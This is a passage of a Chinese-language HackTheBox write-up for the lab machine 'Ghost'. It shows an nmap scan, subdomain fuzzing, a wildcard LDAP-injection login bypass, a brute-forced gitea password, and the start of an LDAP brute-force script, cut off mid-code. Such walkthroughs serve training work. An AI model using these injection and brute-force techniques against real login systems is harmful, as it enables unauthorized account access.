<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Ghost - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Ghost 10.10.11.24                                                                                                              端口扫描80.8008.8443,以及常规域端口： 123456">
<meta property="og:type" content="article">
<meta property="og:title" content="Ghost - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2024/07/15/Ghost-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Ghost 10.10.11.24                                                                                                              端口扫描80.8008.8443,以及常规域端口： 123456">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071501.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071503.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071502.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071504.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071505.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071506.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071507.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071508.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071509.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071510.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071511.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071513.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071512.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071514.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071515.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071517.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071516.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071518.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071519.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071520.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071521.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071522.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071523.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071524.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071525.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071527.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071528.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071529.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071530.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071531.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071532.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071533.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071536.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071534.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071535.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071526.jpg">
<meta property="article:published_time" content="2024-07-15T08:33:14.000Z">
<meta property="article:modified_time" content="2025-04-09T05:15:12.619Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071501.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Ghost - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Ghost - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2024-07-15T08:33:14.000Z" itemprop="datePublished" class="page-time">
  2024-07-15
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8008"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">8008</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8443"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">8443</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#子域名扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">子域名扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#intranet"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">intranet</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#intranet-1"><span class="post-toc-number">4.</span> <span class="post-toc-text">intranet</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LDAP注入"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">LDAP注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gitea"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">gitea</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#forum"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">forum</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gitea-password"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">gitea password</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ldap-brute-py"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">ldap_brute.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#gitea-1"><span class="post-toc-number">5.</span> <span class="post-toc-text">gitea</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#extra-lfi"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">extra lfi</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#api-key"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">api key</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#scan-rs"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">scan.rs</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI"><span class="post-toc-number">6.</span> <span class="post-toc-text">LFI</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#命令注入"><span class="post-toc-number">7.</span> <span class="post-toc-text">命令注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#docker-entrypoint-sh"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">docker-entrypoint.sh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MSSQL-非预期"><span class="post-toc-number">8.</span> <span class="post-toc-text">MSSQL 非预期</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#meterpreter"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">meterpreter</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#system"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">system</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PRIMARY-hashdump"><span class="post-toc-number">8.4.</span> <span class="post-toc-text">PRIMARY hashdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#域信任"><span class="post-toc-number">9.</span> <span class="post-toc-text">域信任</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#预期-user"><span class="post-toc-number">10.</span> <span class="post-toc-text">预期 user</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#GMSA"><span class="post-toc-number">11.</span> <span class="post-toc-text">GMSA</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ADFS"><span class="post-toc-number">12.</span> <span class="post-toc-text">ADFS</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MSSQL"><span class="post-toc-number">13.</span> <span class="post-toc-text">MSSQL</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#flags"><span class="post-toc-number">14.</span> <span class="post-toc-text">flags</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#DC01-hashdump"><span class="post-toc-number">14.1.</span> <span class="post-toc-text">DC01 hashdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">15.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Ghost-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Ghost - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2024-07-15 16:33:14" datetime="2024-07-15T08:33:14.000Z"  itemprop="datePublished">2024-07-15</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Ghost" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Ghost</a></li>
<li>10.10.11.24</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071501.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80.8008.8443,以及常规域端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.24</span></span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2024-07-15 14:32 CST</span><br><span class="line">Nmap scan report for 10.10.11.24</span><br><span class="line">Host is up (0.090s latency).</span><br><span class="line">Not shown: 982 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-15 06:25:25Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: 2024-06-19T15:45:56</span><br><span class="line">|_Not valid after:  2124-06-19T15:55:55</span><br><span class="line">443/tcp  open  https?</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: 2024-06-19T15:45:56</span><br><span class="line">|_Not valid after:  2124-06-19T15:55:55</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">2179/tcp open  vmrdp?</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: 2024-06-19T15:45:56</span><br><span class="line">|_Not valid after:  2124-06-19T15:55:55</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: 2024-06-19T15:45:56</span><br><span class="line">|_Not valid after:  2124-06-19T15:55:55</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2024-07-15T06:26:48+00:00; -7m49s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Not valid before: 2024-06-16T15:49:55</span><br><span class="line">|_Not valid after:  2024-12-16T15:49:55</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">8008/tcp open  http          nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Ghost</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">| http-robots.txt: 5 disallowed entries</span><br><span class="line">|_/ghost/ /p/ /email/ /r/ /webmentions/receive/</span><br><span class="line">|_http-generator: Ghost 5.78</span><br><span class="line">8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-title: Ghost Core</span><br><span class="line">|_Requested resource was /login</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=core.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:core.ghost.htb</span><br><span class="line">| Not valid before: 2024-06-18T15:14:02</span><br><span class="line">|_Not valid after:  2124-05-25T15:14:02</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -7m49s, deviation: 0s, median: -7m49s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-15T06:26:07</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 144.76 seconds</span><br></pre></td></tr></table></figure>

<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问是404:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071503.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="8008"><a href="#8008" class="headerlink" title="8008"></a>8008</h2><p>ghost 博客：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071502.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="8443"><a href="#8443" class="headerlink" title="8443"></a>8443</h2><p>Ghost core,登录用的ADFS，会跳到federation.ghost.htb域名：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071504.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>8443那里的到的子域名加hosts，扫描其他域名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.24 ghost.htb federation.ghost.htb</span><br></pre></td></tr></table></figure>

<p>需要用8008端口，因为80默认404:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://ghost.htb:8008/" -H 'Host: FUZZ.ghost.htb' -fs 0,7676</span><br><span class="line"></span><br><span class="line">intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 112ms]</span><br></pre></td></tr></table></figure>

<h2 id="intranet"><a href="#intranet" class="headerlink" title="intranet"></a>intranet</h2><p>加hosts访问，是登录界面：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071505.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="intranet-1"><a href="#intranet-1" class="headerlink" title="intranet"></a>intranet</h1><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><p>登录请求也可以看出使用的ldap，简单测试发现ldap注入，用户名密码都使用星号，登录进intranet：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071506.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071507.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gitea"><a href="#gitea" class="headerlink" title="gitea"></a>gitea</h2><p>news中可以看到gitea相关信息，用户名gitea_temp_principal，并且提到可以在intranet测试gitea密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071508.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="forum"><a href="#forum" class="headerlink" title="forum"></a>forum</h2><p>forum中可以看到Bitbucket信息bitbucket.ghost.htb，可以猜测gitea就是gitea.ghost.htb：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071509.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071510.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gitea-password"><a href="#gitea-password" class="headerlink" title="gitea password"></a>gitea password</h2><p>根据已有信息，通过ldap注入爆破出用于登录gitea的gitea_temp_principal用户的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">szrr8kpc3z6onlqf</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071511.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024071513.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ldap-brute-py"><a href="#ldap-brute-py" class="headerlink" title="ldap_brute.py"></a>ldap_brute.py</h2><p>来自BF论坛：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://intranet.ghost.htb:8008/login'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'intranet.ghost.htb:8008'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.5'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">    <span class="string">'Next-Action'</span>: <span class="string">'c471eb076ccac91d6f828b671795550fd5925940'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">'1_ldap-username'</span>: (<span class="keyword">None</span>, <span class="string">'gitea_temp_principal'</span>),</span><br><span class="line">    <span class="string">'1_ldap-secret'</span>: (<span class="keyword">None</span>, <span class="string">'s*'</span>),</span><br><span class="line">    <span class="string">'0'</span>: (<span class="keyword">None</span>, <span class="string">'[&#123;&#125;,"$K1"]'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passw = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_lowercase + string.digits:</span><br><span class="line">        files = &#123;</span><br><span 